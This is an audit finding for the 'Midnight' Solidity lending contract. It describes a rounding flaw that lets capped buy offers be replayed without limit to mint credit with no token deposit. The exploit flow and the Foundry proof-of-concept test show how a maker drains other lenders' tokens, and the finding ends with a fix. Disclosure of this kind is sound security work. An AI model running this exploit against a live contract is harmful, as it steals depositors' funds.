### Title
Zero-buyerAssets rounding allows indefinite replay of maxAssets-capped buy offers, minting unbounded credit with no token deposit - (File: src/Midnight.sol)

### Summary

When `offer.buy == true` and `offer.maxAssets > 0`, the `consumed` counter is incremented by `buyerAssets = mulDivDown(units, buyerPrice, WAD)`. If `units * buyerPrice < WAD`, integer division truncates `buyerAssets` to zero, so `consumed` is incremented by zero on every call. The `require(newConsumed <= offer.maxAssets)` guard always passes, the offer is never exhausted, and the maker accumulates credit units with no corresponding token deposit, breaking the protocol solvency invariant.

### Finding Description

**Exact code path — `src/Midnight.sol` lines 363–369:**

```solidity
uint256 buyerAssets = offer.buy
    ? units.mulDivDown(buyerPrice, WAD)   // ← rounds to 0 when units*buyerPrice < WAD
    : units.mulDivUp(buyerPrice, WAD);

if (offer.maxAssets > 0) {
    newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());   // ← passes: 0 <= maxAssets
}
```

`mulDivDown` is `(x * y) / d` with plain integer division (`src/libraries/UtilsLib.sol` line 30). When `units * buyerPrice < WAD (1e18)`, the result is 0.

**Attacker-controlled inputs:**

| Parameter | Value |
|---|---|
| `offer.buy` | `true` |
| `offer.maxAssets` | any `> 0` |
| `offer.tick` | any tick where `tickToPrice(tick) < WAD` (i.e., below MAX_TICK) |
| `units` | any `k` satisfying `k * buyerPrice < WAD` (e.g., `k = 1` when `buyerPrice = WAD - 16`) |

**Exploit flow:**

1. Attacker controls two addresses: `maker` (lender) and `taker` (borrower, different address to pass `SelfTake` check).
2. Maker places a buy offer with `maxAssets = M`, `tick` such that `offerPrice < WAD`, and a permissive ratifier.
3. Taker supplies collateral sufficient to remain healthy under accumulating debt.
4. Taker calls `take(offer, ..., units=1)` in a loop N times.
   - Each call: `buyerAssets = mulDivDown(1, buyerPrice, WAD) = 0`.
   - `consumed[maker][group] += 0` → consumed stays at 0.
   - `require(0 <= M)` passes.
   - Position accounting: `buyerCreditIncrease = 1`, `sellerDebtIncrease = 1` (lines 382–384).
   - Token transfers: `safeTransferFrom(..., 0)` and `safeTransferFrom(..., 0)` — no tokens move (lines 455–456).
   - Maker's `credit += 1` per iteration; taker's `debt += 1` per iteration.
5. After N iterations: maker holds N credit units backed by zero deposited tokens; `consumed` is still 0.
6. Maker calls `withdraw(market, N, maker, maker)` and receives N loan tokens from the protocol's pool — tokens deposited by other users.

**Why existing checks fail:**

- `require(newConsumed <= offer.maxAssets)`: `newConsumed = 0 + 0 = 0 ≤ M` — always passes.
- `require(isHealthy(..., seller))` (line 476): passes as long as taker has pre-supplied collateral.
- `SelfTake` check: bypassed by using two distinct attacker-controlled addresses.
- The behavior is partially acknowledged in the NatSpec at line 94 ("It is possible to give units to a fully consumed assets-based buy offer with price < 1") and demonstrated in `testBugBuyMaxAssetsBypass` (lines 858–889), but neither addresses the case where `consumed` starts at 0 and never advances, allowing the offer to be replayed without bound.

### Impact Explanation

The maker accumulates an arbitrary amount of credit units without ever depositing the corresponding loan tokens. When the maker withdraws, they drain tokens deposited by legitimate lenders. The protocol's invariant that "contract balances cover credit redemption" is violated: total credit outstanding exceeds total tokens held, causing insolvency proportional to the number of zero-asset takes executed.

### Likelihood Explanation

**Preconditions:**
- `offer.buy == true`, `offer.maxAssets > 0` (standard buy-offer configuration).
- `offerPrice < WAD`: any tick strictly below MAX_TICK satisfies this; the tick range is wide.
- `units` small enough that `units * buyerPrice < WAD`: with `buyerPrice = WAD - 16`, `units = 1` suffices.
- Taker must supply collateral to remain healthy.

All preconditions are reachable by an unprivileged attacker with no special access. The attack is repeatable in a single transaction via a loop or multicall. Gas cost is the only practical limit.

### Recommendation

Add a guard that rejects a non-zero `units` take when it would produce zero assets in the assets-capped branch:

```solidity
if (offer.maxAssets > 0) {
    uint256 trackedAssets = offer.buy ? buyerAssets : sellerAssets;
    require(units == 0 || trackedAssets > 0, ZeroAssetsTake());
    newConsumed = consumed[offer.maker][offer.group] += trackedAssets;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());
}
```

This ensures that every non-trivial fill advances `consumed` by at least 1, bounding the number of fills to `maxAssets`.

### Proof of Concept

```solidity
// Foundry stateful fuzz / unit test
function testConsumedNeverAdvances() public {
    // Setup: buy offer, maxAssets = 100, tick just below MAX_TICK so buyerPrice < WAD
    lenderOffer.buy = true;
    lenderOffer.maxUnits = 0;
    lenderOffer.maxAssets = 100;
    lenderOffer.tick = MAX_TICK - 16; // buyerPrice < WAD

    // Taker supplies collateral to stay healthy
    collateralize(market, borrower, 1000);

    uint256 consumedBefore = midnight.consumed(lender, lenderOffer.group);
    uint256 lenderCreditBefore = midnight.creditOf(id, lender);

    // Each take with units=1 produces buyerAssets=0
    for (uint256 i = 0; i < 200; i++) {
        (uint256 ba,) = take(1, borrower, lenderOffer);
        assertEq(ba, 0, "buyerAssets must be 0");
    }

    // INVARIANT VIOLATION: consumed did not advance despite 200 fills
    assertEq(midnight.consumed(lender, lenderOffer.group), consumedBefore,
        "consumed must not advance");

    // Maker credit grew by 200 with zero token deposit
    assertEq(midnight.creditOf(id, lender), lenderCreditBefore + 200,
        "maker credit grew for free");

    // Maker withdraws — drains other users' tokens
    uint256 protocolBalBefore = loanToken.balanceOf(address(midnight));
    vm.prank(lender);
    midnight.withdraw(market, 200, lender, lender);
    assertEq(loanToken.balanceOf(address(midnight)), protocolBalBefore - 200,
        "protocol drained");
}
```

**Expected assertions that fire without the fix:**
- `consumed` stays at `consumedBefore` after 200 fills.
- `creditOf(lender)` increases by 200 with no token deposit.
- Protocol token balance decreases on withdrawal. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** src/Midnight.sol (L93-94)
```text
/// @dev Midnight can call the callback of offers through a no-op take, even if those offers have consumed==max.
/// @dev It is possible to give units to a fully consumed assets-based buy offer with price < 1.
```

**File:** src/Midnight.sol (L363-369)
```text
        uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : units.mulDivUp(buyerPrice, WAD);
        uint256 sellerAssets = offer.buy ? units.mulDivDown(sellerPrice, WAD) : units.mulDivUp(sellerPrice, WAD);

        uint256 newConsumed;
        if (offer.maxAssets > 0) {
            newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
            require(newConsumed <= offer.maxAssets, ConsumedAssets());
```

**File:** src/Midnight.sol (L455-456)
```text
        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, address(this), buyerAssets - sellerAssets);
        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, receiver, sellerAssets);
```

**File:** src/libraries/UtilsLib.sol (L29-31)
```text
    function mulDivDown(uint256 x, uint256 y, uint256 d) internal pure returns (uint256) {
        return (x * y) / d;
    }
```

**File:** test/TakeTest.sol (L857-889)
```text
    // Show that a buy offer with offerPrice < WAD can be taken with units > 0
    function testBugBuyMaxAssetsBypass() public {
        deal(address(loanToken), lender, 0); // lender pays 0
        collateralize(market, borrower, 100);

        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = 1;
        lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD

        // Fully consume the offer before the take.
        vm.prank(lender);
        midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);

        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        uint256 borrowerDebtBefore = midnight.debtOf(id, borrower);
        uint256 totalUnitsBefore = midnight.totalUnits(id);
        uint256 lenderBalBefore = loanToken.balanceOf(lender);
        uint256 borrowerBalBefore = loanToken.balanceOf(borrower);

        (uint256 buyerAssets, uint256 sellerAssets) = take(1, borrower, lenderOffer);

        assertEq(buyerAssets, 0);
        assertEq(sellerAssets, 0);

        // Nothing observable to the cap or token balances changed:
        assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);
        assertEq(loanToken.balanceOf(lender), lenderBalBefore);
        assertEq(loanToken.balanceOf(borrower), borrowerBalBefore);
        // But position state strictly changed:
        assertGt(midnight.creditOf(id, lender), lenderCreditBefore);
        assertGt(midnight.debtOf(id, borrower), borrowerDebtBefore);
        assertGt(midnight.totalUnits(id), totalUnitsBefore);
    }
```
